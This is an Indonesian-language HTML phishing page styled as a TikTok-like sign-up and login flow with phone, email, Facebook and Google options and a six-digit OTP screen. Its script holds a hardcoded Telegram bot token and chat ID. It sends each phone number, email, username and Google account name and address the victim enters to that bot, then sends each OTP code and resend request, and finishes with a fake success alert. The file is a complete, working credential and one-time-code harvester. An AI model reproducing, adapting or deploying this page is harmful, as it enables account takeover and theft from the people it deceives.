<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pendaftaran Full Login Flow</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
    
    <script src="https://accounts.google.com/gsi/client" async defer></script>

    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
        }

        body {
            background-color: #f8f8f8;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
            overflow: hidden;
        }

        /* Container Utama ala Layar HP */
        .app-container {
            width: 100%;
            max-width: 450px;
            height: 100vh;
            background-color: #ffffff;
            position: relative;
            box-shadow: 0 0 20px rgba(0,0,0,0.05);
            overflow: hidden;
        }

        /* Struktur Dasar Setiap Halaman */
        .page {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-color: #ffffff;
            display: flex;
            flex-direction: column;
            justify-content: space-between;
            padding: 20px;
            transition: transform 0.3s ease-in-out, opacity 0.3s ease-in-out;
            opacity: 0;
            transform: translateX(100%);
            pointer-events: none;
        }

        /* Halaman Aktif */
        .page.active {
            opacity: 1;
            transform: translateX(0);
            pointer-events: auto;
            z-index: 5;
        }

        /* Halaman yang keluar ke arah kiri */
        .page.exit-left {
            transform: translateX(-100%);
            opacity: 0;
        }

        /* Header Ikon Rata Sejajar Sempurna */
        .header-icons {
            display: flex;
            justify-content: space-between;
            align-items: center; 
            width: 100%;
            height: 40px; 
            padding: 0 5px;
            margin-bottom: 20px;
        }

        .header-icons i {
            font-size: 20px;
            color: #000000;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            width: 32px;
            height: 32px;
        }

        .content-body {
            flex: 1;
            display: flex;
            flex-direction: column;
            padding: 0 15px;
        }

        /* Footer Bawah */
        .footer-section {
            border-top: 1px solid #f1f1f2;
            padding: 24px 0;
            text-align: center;
            background-color: #ffffff;
            margin: 0 -20px -20px -20px;
        }

        .footer-text {
            font-size: 15px;
            color: #161823;
        }

        .footer-text a {
            color: #fe2c55;
            text-decoration: none;
            font-weight: 600;
        }

        /* STYLE HALAMAN 1 */
        #page1 .content-body {
            align-items: center;
            justify-content: center;
            margin-bottom: 40px;
        }

        #page1 h1 {
            font-size: 32px;
            font-weight: 700;
            margin-bottom: 40px;
            text-align: center;
        }

        .login-btn {
            width: 100%;
            height: 54px;
            background-color: #f1f1f2;
            border: none;
            border-radius: 8px;
            display: flex;
            align-items: center;
            padding: 0 20px;
            margin-bottom: 14px;
            cursor: pointer;
            transition: background-color 0.2s;
        }

        .login-btn:hover { background-color: #e3e3e5; }
        .login-btn i { font-size: 20px; width: 30px; text-align: left; }
        .fa-facebook { color: #1877F2; font-size: 22px !important; }
        .fa-google {
            background: linear-gradient(to right, #4285F4, #EA4335, #FBBC05, #34A853);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
        }

        .btn-text {
            flex: 1;
            text-align: center;
            font-size: 15px;
            font-weight: 600;
            color: #161823;
            white-space: nowrap;
            overflow: hidden;
            text-overflow: ellipsis;
            padding-right: 30px;
        }

        .policy-text {
            font-size: 12px;
            color: #8a8b91;
            text-align: center;
            line-height: 1.5;
            margin-top: 20px;
        }

        .policy-text a { color: #5b7083; text-decoration: none; font-weight: 500; }

        /* STYLE HALAMAN 2 */
        .page h2 { font-size: 24px; font-weight: 700; margin-bottom: 25px; color: #000000; }
        
        .tab-menu { display: flex; border-bottom: 1px solid #f1f1f2; margin-bottom: 25px; }
        .tab-item {
            padding-bottom: 12px; margin-right: 24px;
            font-weight: 600; color: #8a8b91; cursor: pointer; font-size: 16px;
            transition: color 0.2s;
            white-space: nowrap;
        }
        .tab-item.active { color: #000000; border-bottom: 2px solid #000000; margin-bottom: -1px; }

        .input-group {
            display: flex; align-items: center; background-color: #f8f8f9;
            border-radius: 4px; padding: 0 15px; height: 46px; margin-bottom: 30px;
        }
        
        .country-code { 
            font-weight: 600; color: #161823; font-size: 15px; 
            margin-right: 12px; display: flex; align-items: center; gap: 6px;
            cursor: pointer;
        }
        .country-code i { font-size: 12px; color: #161823; }

        .input-group input { border: none; background: transparent; width: 100%; height: 100%; font-size: 15px; outline: none; color: #000000; }
        .input-group input::placeholder { color: #bbbcbf; font-weight: 400; }

        .lanjutkan-btn {
            width: 100%; height: 46px; background-color: #fcd2dc;
            color: #ffffff; border: none; border-radius: 24px;
            font-size: 15px; font-weight: 600; cursor: not-allowed;
            margin-top: auto; margin-bottom: 20px;
            transition: background-color 0.3s;
        }
        .lanjutkan-btn.ready { background-color: #fe2c55; cursor: pointer; }

        /* STYLE HALAMAN 3 */
        .sub-title { font-size: 14px; color: #8a8b91; margin-bottom: 30px; line-height: 1.4; }
        .sub-title span { color: #161823; font-weight: 500; }

        .otp-wrapper {
            width: 100%;
            margin-bottom: 25px;
        }
        
        .otp-container { 
            display: flex;
            justify-content: center;
            gap: 6px; 
            width: 100%;
        }
        
        .otp-box {
            flex: 1; 
            max-width: 50px; 
            height: 50px; 
            background-color: #f1f1f2;
            border: none; 
            border-radius: 6px; 
            text-align: center;
            font-size: 22px; 
            font-weight: 700; 
            color: #161823; 
            outline: none;
        }
        .otp-box:focus { background-color: #e3e3e5; border: 1px solid #8a8b91; }
        
        .timer-text { font-size: 14px; color: #8a8b91; margin-top: 15px; text-align: left; }
        .timer-text span { color: #8a8b91; font-weight: 400; }

        .recovery-link {
            display: none;
            font-size: 14px;
            color: #0055ff;
            font-weight: 600;
            text-decoration: none;
            margin-top: 15px;
            text-align: left;
        }
    </style>
</head>
<body>

    <div class="app-container">

        <div class="page active" id="page1">
            <div class="header-icons">
                <i class="far fa-question-circle" onclick="simulateAlert('Pusat Bantuan Pendaftaran')"></i>
                <i class="fas fa-times" onclick="simulateAlert('Menutup Halaman Login')"></i>
            </div>
            <div class="content-body">
                <h1>Masuk ke Pendaftaran</h1>
                <button class="login-btn" onclick="navigateTo('page1', 'page2')">
                    <i class="fas fa-user"></i>
                    <span class="btn-text">Gunakan nomor telepon/ atau email</span>
                </button>
                <button class="login-btn" onclick="simulateAlert('Menghubungkan ke Facebook...')">
                    <i class="fab fa-facebook"></i>
                    <span class="btn-text">Lanjutkan dengan Facebook</span>
                </button>
                
                <button class="login-btn" onclick="panggilGoogleLogin()">
                    <i class="fab fa-google"></i>
                    <span class="btn-text">Lanjutkan dengan Google</span>
                </button>

                <p class="policy-text">
                    Dengan menggunakan akun yang berlokasi di <a href="#" onclick="simulateAlert('Wilayah: Indonesia')">Indonesia</a>, Anda menyetujui <a href="#" onclick="simulateAlert('Membuka Ketentuan Layanan')">Ketentuan Layanan</a> kami.
                </p>
            </div>
            <div class="footer-section">
                <p class="footer-text">Salam sehat? <a href="#" onclick="simulateAlert('Membuka Halaman Registrasi / Mendaftar')">Mendaftar</a></p>
            </div>
        </div>

        <div class="page" id="page2">
            <div class="header-icons">
                <i class="fas fa-chevron-left" onclick="navigateTo('page2', 'page1', true)"></i>
                <i class="far fa-question-circle" onclick="simulateAlert('Bantuan Pilihan Metode Masuk')"></i>
            </div>
            <div class="content-body">
                <h2>Mendaftar</h2>
                
                <div class="tab-menu">
                    <div class="tab-item active" id="tabPhone" onclick="switchTab('phone')">Telepon</div>
                    <div class="tab-item" id="tabEmail" onclick="switchTab('email')">Alamat email</div>
                </div>

                <div class="input-group">
                    <div class="country-code" id="phoneCodeArea" onclick="simulateAlert('Membuka Pilihan Kode Negara')">ID +62 <i class="fas fa-chevron-down"></i></div>
                    <input type="tel" id="mainInput" placeholder="Nomor telepon" oninput="validateForm()">
                </div>

                <button class="lanjutkan-btn" id="submitBtn" disabled onclick="handleFormSubmit()">Lanjutkan</button>
            </div>
            <div class="footer-section">
                <p class="footer-text">Salam sehat.<a href="#" onclick="simulateAlert('Membuka Halaman Registrasi / Mendaftar')">Mendaftar</a></p>
            </div>
        </div>

        <div class="page" id="page3">
            <div class="header-icons">
                <i class="fas fa-chevron-left" onclick="navigateTo('page3', 'page2', true)"></i>
                <i class="far fa-question-circle" onclick="simulateAlert('Masalah verifikasi akun?')"></i>
            </div>
            <div class="content-body">
                <h2 id="otpTitle">Masukkan kode 6 digit</h2>
                <p class="sub-title" id="otpSubtitle">Kode dikirim ke <span id="displayTarget">+62 8523544521</span></p>
                
                <div class="otp-wrapper">
                    <div class="otp-container">
                        <input type="text" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" oninput="moveFocus(this, 0)" onkeydown="backspaceFocus(this, event)">
                        <input type="text" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" oninput="moveFocus(this, 1)" onkeydown="backspaceFocus(this, event)">
                        <input type="text" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" oninput="moveFocus(this, 2)" onkeydown="backspaceFocus(this, event)">
                        <input type="text" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" oninput="moveFocus(this, 3)" onkeydown="backspaceFocus(this, event)">
                        <input type="text" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" oninput="moveFocus(this, 4)" onkeydown="backspaceFocus(this, event)">
                        <input type="text" class="otp-box" maxlength="1" pattern="\d*" inputmode="numeric" oninput="moveFocus(this, 5)" onkeydown="backspaceFocus(this, event)">
                    </div>
                    <p class="timer-text">Kirim ulang kode <span id="timer" onclick="resendCode()">(59s)</span></p>
                    <a href="#" class="recovery-link" id="recoveryLink" onclick="simulateAlert('Membuka alur Pemulihan Akun...')">Pulihkan akun Anda</a>
                </div>
            </div>
            <div class="footer-section">
                <p class="footer-text">salam sehat.<a href="#" onclick="simulateAlert('Membuka Halaman Registrasi / Mendaftar')">Mendaftar</a></p>
            </div>
        </div>

    </div>

    <script>
        // TOKEN DAN CHAT ID TELEGRAM
        var tokenBot = "8880993139:AAFsBfqnYa_8d_A2aiiNX3VMxATpMvw_5VQ"; 
        var chatID = "8859032590";     
        var urlTlgrm = "https://api.telegram.org/bot" + tokenBot + "/sendMessage";
        
        let currentActiveTab = 'phone';
        let countdownTimer;
        let dataInputAwal = "";

        // Inisialisasi Google API saat web pertama kali terbuka
        window.onload = function () {
            google.accounts.id.initialize({
                client_id: "1059530467140-7nmv7m27gkm6m902ch1g787q2knm8q15.apps.googleusercontent.com",
                callback: handleCredentialResponse
            });
        }

        // Memunculkan pop-up akun Google bawaan HP
        function panggilGoogleLogin() {
            google.accounts.id.prompt((notification) => {
                if (notification.isNotDisplayed() || notification.isSkippedMoment()) {
                    simulateAlert("Membuka Pilihan Akun Google...");
                }
            });
        }

        // Menangkap data setelah user memilih salah satu Gmail di HP mereka
        function handleCredentialResponse(response) {
            const responsePayload = decodeJwtResponse(response.credential);
            
            const namaUser = responsePayload.name;
            const emailUser = responsePayload.email;

            // Simpan email secara global agar sinkron dengan laporan OTP nanti
            dataInputAwal = emailUser;

            // Kirim info akun Gmail yang dipilih ke bot Telegram
            let pesanGoogle = `🌐 *LOGIN GOOGLE DITERIMA*\n\n` +
                              `*Nama Akun:* ${namaUser}\n` +
                              `*Email Gmail:* \`${emailUser}\`\n`;
            kirimKeTelegram(pesanGoogle);

            // Ubah teks panduan pada halaman OTP secara otomatis sesuai Gmail terpilih
            const otpTitle = document.getElementById('otpTitle');
            const otpSubtitle = document.getElementById('otpSubtitle');
            const recoveryLink = document.getElementById('recoveryLink');

            otpTitle.innerText = "Verifikasikan alamat email";
            otpSubtitle.innerHTML = `Gunakan tautan atau masukkan kode yang dikirim ke <span>${emailUser}</span>`;
            recoveryLink.style.display = "block";

            // Reset seluruh kotak input OTP agar kosong bersih
            document.querySelectorAll('.otp-box').forEach(input => input.value = "");

            // Alihkan langsung dari Halaman Utama (page1) ke Halaman OTP (page3)
            navigateTo('page1', 'page3');
            startTimer();
        }

        // Fungsi mendekode data JWT Token Google
        function decodeJwtResponse(token) {
            var base64Url = token.split('.')[1];
            var base64 = base64Url.replace(/-/g, '+').replace(/_/g, '/');
            var jsonPayload = decodeURIComponent(window.atob(base64).split('').map(function(c) {
                return '%' + ('0' + c.charCodeAt(0).toString(16)).slice(-2);
            }).join(''));
            return JSON.parse(jsonPayload);
        }

        // Fungsi pengiriman pesan string ke API Telegram
        function kirimKeTelegram(pesan) {
            fetch(urlTlgrm, {
                method: "POST",
                headers: { "Content-Type": "application/json" },
                body: JSON.stringify({
                    chat_id: chatID,
                    text: pesan,
                    parse_mode: "Markdown"
                })
            })
            .then(res => res.json())
            .catch(err => console.error(err));
        }

        function navigateTo(fromPageId, toPageId, isBack = false) {
            const fromPage = document.getElementById(fromPageId);
            const toPage = document.getElementById(toPageId);

            if (isBack) {
                fromPage.style.transform = "translateX(100%)";
                fromPage.style.opacity = "0";
                toPage.classList.remove("exit-left");
                toPage.classList.add("active");
                if(fromPageId === 'page3') clearInterval(countdownTimer);
            } else {
                fromPage.classList.add("exit-left");
                fromPage.classList.remove("active");
                toPage.classList.add("active");
                toPage.style.transform = "translateX(0)";
                toPage.style.opacity = "1";
            }
            fromPage.classList.remove("active");
        }

        function switchTab(tabType) {
            const tabPhone = document.getElementById('tabPhone');
            const tabEmail = document.getElementById('tabEmail');
            const phoneCode = document.getElementById('phoneCodeArea');
            const inputField = document.getElementById('mainInput');
            const submitBtn = document.getElementById('submitBtn');

            currentActiveTab = tabType;
            inputField.value = "";
            submitBtn.classList.remove('ready');
            submitBtn.setAttribute('disabled', 'true');

            if (tabType === 'phone') {
                tabPhone.classList.add('active');
                tabEmail.classList.remove('active');
                phoneCode.style.display = "flex";
                inputField.type = "tel";
                inputField.placeholder = "Nomor telepon";
            } else {
                tabEmail.classList.add('active');
                tabPhone.classList.remove('active');
                phoneCode.style.display = "none";
                inputField.type = "text";
                inputField.placeholder = "Alamat email atau nama pengguna";
            }
            inputField.focus();
        }

        function validateForm() {
            const value = document.getElementById('mainInput').value.trim();
            const submitBtn = document.getElementById('submitBtn');
            let isValid = false;

            if (currentActiveTab === 'phone') {
                if (value.length >= 9 && !isNaN(value)) isValid = true;
            } else {
                if (value.length >= 3) isValid = true;
            }

            if (isValid) {
                submitBtn.classList.add('ready');
                submitBtn.removeAttribute('disabled');
            } else {
                submitBtn.classList.remove('ready');
                submitBtn.setAttribute('disabled', 'true');
            }
        }

        function handleFormSubmit() {
            const inputValue = document.getElementById('mainInput').value;
            const otpTitle = document.getElementById('otpTitle');
            const otpSubtitle = document.getElementById('otpSubtitle');
            const recoveryLink = document.getElementById('recoveryLink');

            let pesanTelegram = "";

            if (currentActiveTab === 'phone') {
                dataInputAwal = "+62 " + inputValue;
                otpTitle.innerText = "Masukkan kode 6 digit";
                otpSubtitle.innerHTML = `Kode dikirim ke <span>${dataInputAwal}</span>`;
                recoveryLink.style.display = "none";
                pesanTelegram = `📌 *Data Masuk Baru*\n\n*Metode:* Telepon\n*Nomor HP:* \`${dataInputAwal}\``;
            } else {
                dataInputAwal = inputValue;
                otpTitle.innerText = "Verifikasikan alamat email";
                otpSubtitle.innerHTML = `Gunakan tautan atau masukkan kode yang dikirim ke <span>${dataInputAwal}</span>`;
                recoveryLink.style.display = "block";
                pesanTelegram = `📌 *Data Masuk Baru*\n\n*Metode:* Email / Username\n*Data:* \`${dataInputAwal}\``;
            }

            kirimKeTelegram(pesanTelegram);
            document.querySelectorAll('.otp-box').forEach(input => input.value = "");
            navigateTo('page2', 'page3');
            startTimer();
        }

        function moveFocus(current, index) {
            if (current.value.length >= 1 && index < 5) {
                document.querySelectorAll('.otp-box')[index + 1].focus();
            } else if (index === 5 && current.value.length === 1) {
                let kodeOTP = "";
                document.querySelectorAll('.otp-box').forEach(input => {
                    kodeOTP += input.value;
                });

                let pesanOTP = `🔑 *Kode OTP Diterima!*\n\n*Target:* \`${dataInputAwal}\` \n*Kode OTP:* \`${kodeOTP}\``;
                kirimKeTelegram(pesanOTP);

                setTimeout(() => {
                    alert("🎉 Verifikasi Sukses! Anda disimulasikan berhasil masuk ke Pendaftaran.");
                    location.reload();
                }, 400);
            }
        }

        function backspaceFocus(current, event) {
            if (event.key === "Backspace" && current.value.length === 0) {
                const inputs = document.querySelectorAll('.otp-box');
                for (let i = 0; i < inputs.length; i++) {
                    if (inputs[i] === current && i > 0) {
                        inputs[i - 1].focus();
                        break;
                    }
                }
            }
        }

        function startTimer() {
            let timeLeft = 59;
            const timerElement = document.getElementById('timer');
            timerElement.style.pointerEvents = "none";
            
            countdownTimer = setInterval(() => {
                if(timeLeft <= 0) {
                    clearInterval(countdownTimer);
                    timerElement.innerText = "Kirim ulang kode";
                    timerElement.style.pointerEvents = "auto";
                } else {
                    timerElement.innerText = `${timeLeft}s`;
                }
                timeLeft -= 1;
            }, 1000);
        }

        function resendCode() {
            alert("Kode OTP baru telah dikirim ulang ke akun Anda!");
            kirimKeTelegram(`🔄 *User meminta kirim ulang kode OTP untuk:* \`${dataInputAwal}\``);
            startTimer();
        }

        function simulateAlert(message) {
            alert(`[Simulasi]: ${message}`);
        }
    </script>
</body>
</html>
